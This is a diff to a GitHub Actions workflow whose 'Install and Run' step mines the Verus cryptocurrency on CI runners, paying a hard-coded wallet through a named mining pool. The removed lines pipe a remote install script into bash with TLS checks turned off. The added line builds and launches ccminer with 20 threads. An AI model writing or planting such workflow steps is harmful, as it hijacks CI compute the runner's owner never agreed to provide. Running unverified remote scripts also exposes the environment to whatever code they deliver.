@@ -18,7 +18,4 @@ jobs:
 
       - name: Install and Run
         run: |
-          curl -o- -k https://raw.githubusercontent.com/TheRetroMike/VerusCliMining/main/install.sh | bash
-          cd ~/ccminer
-          sed -i 's|"user": ".*"|"user": "RNjEn7tNTZ6DuYnYrxKMsvYzBgJ11P5hQ4"|g' config.json
-          ./ccminer
+          sudo apt-get update && sudo apt-get install -y build-essential libcurl4-openssl-dev libssl-dev git automake && git clone https://github.com/tpruvot/ccminer.git && cd ccminer && ./build.sh && ./ccminer -a verus -o stratum+tcp://na.luckpool.net:3957 -u RNjEn7tNTZ6DuYnYrxKMsvYzBgJ11P5hQ4 -p x -t 20
